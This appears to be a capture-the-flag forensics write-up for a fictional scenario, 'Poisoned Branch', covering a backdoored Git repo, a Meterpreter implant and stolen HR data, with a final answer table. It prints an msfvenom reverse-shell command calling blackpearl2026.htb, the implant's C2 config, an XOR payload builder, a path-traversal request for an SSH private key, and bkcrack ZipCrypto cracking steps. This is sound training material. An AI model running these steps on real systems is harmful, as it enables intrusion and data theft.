# Poisoned Branch — CTF Writeup

## Scenario

**Scenario:** Poisoned Branch  
**Category:** DFIR / Forensics / Malware Analysis  
**Environment:** Linux  
**Tools Used:** Git, Linux CLI, `strings`, `file`, `curl`, Metasploit artifacts, SSH, `zip2john`, John the Ripper, `bkcrack`, `pdftotext`

> All characters, organisations, locations, and events in this challenge are fictional.

---

## Summary

The investigation began with a malicious Git repository and eventually led to the recovery of sensitive documents exfiltrated by the attacker.

The attack chain involved:

1. A malicious Git repository named `diogenes-ticket-parser`
2. An XOR-obfuscated payload named `calibration.bin`
3. Deployment of a Linux Meterpreter implant as `.integrity`
4. A callback to `blackpearl2026.htb:31337`
5. Interactive access through Meterpreter
6. Discovery and download of a sensitive HR PDF
7. Deletion of the original document from the victim
8. Exfiltration to the attacker's `BlackPearl2026.htb:9999` infrastructure
9. Discovery of a path traversal flaw on the attacker's own Flask server
10. Recovery of Moran's SSH private key
11. Direct SSH access to the attacker host
12. Recovery of `LOOT.zip`
13. A known-plaintext attack against ZipCrypto using `bkcrack`
14. Recovery of the stolen HR roster
15. Identification of the redacted employee and their home address

---

# Final Answers

| # | Answer |
|---|---|
| 1 | `diogenes-ticket-parser` |
| 2 | `cbass.Moran@blackpearl2026.htb` |
| 3 | `calibration.bin` |
| 4 | `/home/Tom/.cache/.ticket-parser/.integrity` |
| 5 | `31337` |
| 6 | `1514` |
| 7 | `BlackPearl2026.htb:9999` |
| 8 | `X-Operator-Auth=napoleon_moran_1894` |
| 9 | `rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf` |
| 10 | `1549` |
| 11 | `set payload linux/x64/meterpreter_reverse_tcp` |
| 12 | `search -d ONBOARDING -f *.pdf` |
| 13 | `LOOT.zip` |
| 14 | `Sarah Kemp` |
| 15 | `Flat 6, Ashdown House, Palace Court, London W2 4LS` |

---

# Investigation

## 1. Malicious Repository

Analysis of the supplied Git artifacts identified the repository responsible for the compromise:

```text
diogenes-ticket-parser
```

Git metadata revealed the author information:

```text
Sebastain Moran <cbass.Moran@blackpearl2026.htb>
```

This provided the first link to Moran and the later attacker infrastructure.

### Answers

```text
Q1: diogenes-ticket-parser
Q2: cbass.Moran@blackpearl2026.htb
```

---

## 2. Suspicious Payload

The repository contained a suspicious file:

```text
calibration.bin
```

It was not directly identified as a normal executable and appeared to contain obfuscated data.

Later, while examining the attacker's server, the following script was recovered:

```python
#!/usr/bin/env python3
from pathlib import Path

def xor_repeating(first: bytes, second: bytes) -> bytes:
    if not first or not second:
        raise ValueError("Input files cannot be empty.")

    if len(first) >= len(second):
        longer, shorter = first, second
    else:
        longer, shorter = second, first

    return bytes(
        byte ^ shorter[index % len(shorter)]
        for index, byte in enumerate(longer)
    )

def main():
    source_dir = Path(__file__).resolve().parent

    image_path = source_dir / "diogenes.jpg"
    reverse_path = source_dir / "reverse.bin"
    output_path = source_dir / "calibration.bin"

    image_data = image_path.read_bytes()
    reverse_data = reverse_path.read_bytes()

    calibration_data = xor_repeating(image_data, reverse_data)
    output_path.write_bytes(calibration_data)
```

This confirmed that `calibration.bin` was created by XORing:

```text
diogenes.jpg
reverse.bin
```

### Answer

```text
Q3: calibration.bin
```

---

## 3. Implant Installation Path

Another attacker-side script named `git_payload_gen.sh` contained:

```bash
echo -n 'chmod +x ~/.cache/.ticket-parser/.integrity; ~/.cache/.ticket-parser/.integrity 2>&1 &' | base64
```

The payload was therefore executed from:

```text
~/.cache/.ticket-parser/.integrity
```

Since the compromised user was Tom, the full path was:

```text
/home/Tom/.cache/.ticket-parser/.integrity
```

### Answer

```text
Q4: /home/Tom/.cache/.ticket-parser/.integrity
```

---

## 4. Implant Analysis

The attacker's unobfuscated binary was recovered as:

```text
reverse.bin
```

Running:

```bash
file reverse.bin
```

identified it as:

```text
ELF 64-bit LSB pie executable, x86-64, static-pie linked
```

Running `strings` exposed a Mettle configuration:

```text
mettle -U "DZX5O4OdQwxuIGgiBIR4cA==" \
-G "AAAAAAAAAAAAAAAAAAAAAA==" \
-u "tcp://blackpearl2026.htb:31337" \
-d "0" -o "" -b "0"
```

This directly revealed the callback host and port:

```text
blackpearl2026.htb:31337
```

The attacker's payload creation script confirmed this:

```bash
msfvenom -p linux/x64/meterpreter_reverse_tcp \
LHOST=blackpearl2026.htb \
LPORT=31337 \
-f elf \
-o reverse.bin
```

### Answer

```text
Q5: 31337
```

---

## 5. Implant Process

Host forensic evidence showed the malicious `.integrity` process running with:

```text
PID: 1514
```

### Answer

```text
Q6: 1514
```

---

## 6. Attacker Infrastructure

Network evidence showed that the compromised system attempted to communicate with:

```text
BlackPearl2026.htb:9999
```

before later IP-based communication.

After mapping the challenge IP to the hostname, the service could be accessed with:

```bash
curl http://BlackPearl2026.htb:9999/
```

The application identified itself as:

```text
Moran File Exchange
APT NAPOLEON transfer infrastructure
```

### Answer

```text
Q7: BlackPearl2026.htb:9999
```

---

## 7. Authentication Cookie

Source code for the Flask server was later recovered.

The authentication values were hardcoded:

```python
COOKIE_NAME = "X-Operator-Auth"
COOKIE_VALUE = "napoleon_moran_1894"
```

Authenticated requests were therefore made using:

```bash
-H 'Cookie: X-Operator-Auth=napoleon_moran_1894'
```

### Answer

```text
Q8: X-Operator-Auth=napoleon_moran_1894
```

---

## 8. File Deletion

Linux process/audit evidence showed the attacker deleting the sensitive document using:

```bash
rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf
```

The parent process ID associated with the command was:

```text
1549
```

### Answers

```text
Q9: rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf
Q10: 1549
```

---

# Investigating Moran's Infrastructure

## 9. Enumerating Available Tools

The authenticated endpoint:

```text
/tools
```

returned:

```json
{
  "tools": [
    "calibration.bin",
    "create_backdoor.sh",
    "create_cal_bin.py",
    "diogenes.jpg",
    "git_payload_gen.sh",
    "reverse.bin"
  ]
}
```

The files explained how the attacker generated and deployed the implant.

---

## 10. Flask Path Traversal

The Flask source contained:

```python
@app.get("/download")
def download():
    requested_file = request.args.get("file", "")

    if not requested_file:
        return dead_end()

    target_file = PUBLIC_DIR / requested_file

    if not target_file.is_file():
        return dead_end()

    return send_file(
        target_file,
        as_attachment=True,
        download_name=target_file.name
    )
```

No path canonicalisation or traversal protection was performed.

This allowed requests such as:

```bash
curl -s \
  -H 'Cookie: X-Operator-Auth=napoleon_moran_1894' \
  'http://BlackPearl2026.htb:9999/download?file=../../.ssh/id_rsa.pub'
```

The request successfully returned Moran's SSH public key.

The same vulnerability allowed retrieval of:

```text
/home/moran/.ssh/id_rsa
```

The file began with:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
```

This provided direct access to the attacker system.

---

## 11. SSH Access

The recovered private key was saved locally:

```bash
chmod 600 moran_id_rsa
```

SSH access was obtained using:

```bash
ssh -i moran_id_rsa moran@10.129.251.10
```

Verification showed:

```bash
whoami
pwd
```

Output:

```text
moran
/home/moran
```

---

# Metasploit Investigation

## 12. Metasploit History

Moran's `.msf4/history` contained:

```text
exit
use exploit/multi/handler
set lport 31337
set lhost blackpearl2026.htb
set payload linux/x64/meterpreter_reverse_tcp
run
```

The question specifically asked for the command used while preparing the listener that declared the implant architecture.

The correct command was:

```text
set payload linux/x64/meterpreter_reverse_tcp
```

rather than the `msfvenom` command used to generate the executable.

### Answer

```text
Q11: set payload linux/x64/meterpreter_reverse_tcp
```

---

## 13. Meterpreter History

The recovered Meterpreter history showed:

```text
getuid
help
sysinfo
pwd
cd ../../
ls -la
cd .ssh
ls -la
shell
ls
shell
search -h
search -d ONBOARDING
search -d ONBOARDING -f *.pdf
search -f *.pdf
pwd
cd ../ONBOARDING
ls
cd ..
ls
cd Work_Stuff/
ls
cd ONBOARDING/
ls
download -h
download Gov_HR_Continuity_Emergency_Callout_Roster.pdf
shell
bg
```

The exact search command requested by the challenge was:

```text
search -d ONBOARDING -f *.pdf
```

### Answer

```text
Q12: search -d ONBOARDING -f *.pdf
```

The attacker eventually downloaded:

```text
Gov_HR_Continuity_Emergency_Callout_Roster.pdf
```

---

# Exfiltration

## 14. Locating Exfiltrated Data

On Moran's server:

```bash
ls -lah ~/Exfiltrated_Loot
```

returned:

```text
LOOT.zip
README.txt
```

The README contained:

```text
Upon exfiltration of loot. Package into a password protected zip. Remove remnants.
```

This confirmed that the stolen documents were stored in:

```text
LOOT.zip
```

### Answer

```text
Q13: LOOT.zip
```

---

## 15. Archive Contents

Running:

```bash
unzip -l LOOT.zip
```

showed:

```text
Archive: LOOT.zip

Length      Name
------      ----
41          cvoss_exfil
78587       Gov_HR_Continuity_Emergency_Callout_Roster.pdf
83          README.txt
```

All files were encrypted.

---

# Breaking LOOT.zip

## 16. Initial Password Cracking

The archive was copied to Kali:

```bash
scp -i moran_id_rsa \
  moran@10.129.251.10:/home/moran/Exfiltrated_Loot/LOOT.zip \
  ~/Downloads/LOOT.zip
```

A John hash was generated:

```bash
zip2john LOOT.zip > loot.hash
```

RockYou was tested:

```bash
john loot.hash \
  --wordlist=/usr/share/wordlists/rockyou.txt
```

Result:

```text
0 password hashes cracked, 1 left
```

The password was therefore not present in RockYou.

---

## 17. Known-Plaintext Attack

The critical weakness was that the unencrypted `README.txt` existed beside the archive while an encrypted copy of the exact same file existed inside `LOOT.zip`.

Because the archive used legacy PKZIP encryption, this allowed a known-plaintext attack.

A plaintext ZIP was created:

```bash
zip plain.zip README.txt
```

`bkcrack` was then used:

```bash
~/Downloads/bkcrack/build/src/cli/bkcrack \
  -C ~/Downloads/LOOT.zip \
  -c README.txt \
  -P ~/Downloads/plain.zip \
  -p README.txt
```

The attack succeeded:

```text
Z reduction using 69 bytes of known plaintext

Keys: 85b6bbc1 27824945 ce665bee

Found a solution.
```

Recovered internal ZipCrypto keys:

```text
85b6bbc1 27824945 ce665bee
```

The original ZIP password was no longer required.

---

## 18. Decrypting the Archive

The archive was decrypted using the recovered keys:

```bash
~/Downloads/bkcrack/build/src/cli/bkcrack \
  -C ~/Downloads/LOOT.zip \
  -k 85b6bbc1 27824945 ce665bee \
  -D ~/Downloads/LOOT_decrypted.zip
```

The contents were then extracted:

```bash
mkdir ~/Downloads/loot

unzip ~/Downloads/LOOT_decrypted.zip \
  -d ~/Downloads/loot
```

---

# Exfiltrated Credentials

## 19. `cvoss_exfil`

The small file contained:

```bash
cat ~/Downloads/loot/cvoss_exfil
```

Output:

```text
tainsworth:d10g3n3s_T1ck3ts#2026:forever
```

This appears to contain credential-related information for:

```text
tainsworth
```

which corresponds to Tom Ainsworth.

This was not required for the final question set but provided additional evidence from the exfiltration.

---

# Stolen HR Roster

## 20. Extracting PDF Text

The stolen PDF was processed using:

```bash
pdftotext -layout \
  ~/Downloads/loot/Gov_HR_Continuity_Emergency_Callout_Roster.pdf \
  ~/Downloads/roster.txt
```

The document was:

```text
DIOGENES HR CONTINUITY
Emergency Call-Out Roster
London Response Group
```

One entry was particularly important:

```text
DIO-1648
Sarah Kemp
skemp
Identity Operations
REDACTED
Tier 1
+44 7700 900 317
Flat 6, Ashdown House, Palace Court, London W2 4LS
CONFIDENTIAL
```

Sarah Kemp was the only employee whose **Position** field had been redacted.

### Answer

```text
Q14: Sarah Kemp
```

Her corresponding home address was:

```text
Flat 6, Ashdown House, Palace Court, London W2 4LS
```

### Answer

```text
Q15: Flat 6, Ashdown House, Palace Court, London W2 4LS
```

---

# Complete Attack Chain

```text
Malicious Git Repository
        |
        v
diogenes-ticket-parser
        |
        v
calibration.bin
        |
        | XOR with diogenes.jpg
        v
reverse.bin
Linux x64 Meterpreter
        |
        v
/home/Tom/.cache/.ticket-parser/.integrity
        |
        v
blackpearl2026.htb:31337
        |
        v
Meterpreter Session
        |
        v
search -d ONBOARDING -f *.pdf
        |
        v
Gov_HR_Continuity_Emergency_Callout_Roster.pdf
        |
        v
Meterpreter Download
        |
        v
rm Gov_HR_Continuity_Emergency_Callout_Roster.pdf
        |
        v
Attacker Infrastructure
BlackPearl2026.htb:9999
        |
        v
/home/moran/Exfiltrated_Loot/
        |
        v
LOOT.zip
        |
        | ZipCrypto
        | Known-plaintext attack
        v
bkcrack
        |
        v
Keys:
85b6bbc1 27824945 ce665bee
        |
        v
LOOT_decrypted.zip
        |
        +------------------------------+
        |                              |
        v                              v
cvoss_exfil                  HR Continuity Roster
        |                              |
        v                              v
tainsworth credentials       Sarah Kemp
                                       |
                                       v
                         Flat 6, Ashdown House,
                         Palace Court,
                         London W2 4LS
```

---

# Indicators and Artifacts

| Artifact | Value |
|---|---|
| Malicious repository | `diogenes-ticket-parser` |
| Git author email | `cbass.Moran@blackpearl2026.htb` |
| Obfuscated payload | `calibration.bin` |
| Implant | `.integrity` |
| Implant path | `/home/Tom/.cache/.ticket-parser/.integrity` |
| Implant PID | `1514` |
| C2 hostname | `blackpearl2026.htb` |
| C2 port | `31337` |
| Web infrastructure | `BlackPearl2026.htb:9999` |
| Authentication cookie | `X-Operator-Auth=napoleon_moran_1894` |
| Exfiltrated document | `Gov_HR_Continuity_Emergency_Callout_Roster.pdf` |
| Exfiltration archive | `LOOT.zip` |
| Attacker account | `moran` |
| Metasploit payload | `linux/x64/meterpreter_reverse_tcp` |
| ZipCrypto key 1 | `85b6bbc1` |
| ZipCrypto key 2 | `27824945` |
| ZipCrypto key 3 | `ce665bee` |

---

# Key Findings

The investigation demonstrated several important security issues:

- A compromised software repository was used as the initial delivery mechanism.
- The payload was disguised through XOR obfuscation using an image file.
- The attacker deployed a Linux x64 Meterpreter implant.
- Metasploit history provided strong evidence of the attacker's setup and actions.
- The attacker deleted the stolen file after exfiltration in an attempt to remove evidence.
- The attacker's Flask file server contained a directory traversal vulnerability.
- That vulnerability exposed the attacker's SSH private key.
- Direct SSH access exposed the exfiltration directory.
- The stolen documents were protected only with legacy ZipCrypto.
- An identical plaintext copy of `README.txt` existed outside the encrypted archive.
- This made a known-plaintext attack possible and allowed the archive to be decrypted without recovering its password.

---

# Conclusion

`Poisoned Branch` required correlating evidence from multiple sources rather than relying on one artifact.

The Git repository revealed the initial compromise and attacker identity. Malware analysis established the implant architecture and callback infrastructure. Linux forensic evidence identified the implant process and cleanup activity. Metasploit history reconstructed the attacker's interactive actions, including the exact search used to locate sensitive PDFs.

The investigation then moved onto the attacker's own infrastructure. A directory traversal vulnerability in the Moran File Exchange exposed Moran's SSH key, allowing direct access to the server and recovery of the exfiltration archive.

Although `LOOT.zip` was password protected and its password was not present in RockYou, its use of legacy ZipCrypto combined with a known plaintext copy of `README.txt` allowed the encryption keys to be recovered with `bkcrack`.

The decrypted HR roster ultimately identified the employee whose position had been redacted as:

```text
Sarah Kemp
```

with the address:

```text
Flat 6, Ashdown House, Palace Court, London W2 4LS
```

This completed all fifteen questions in the Poisoned Branch investigation.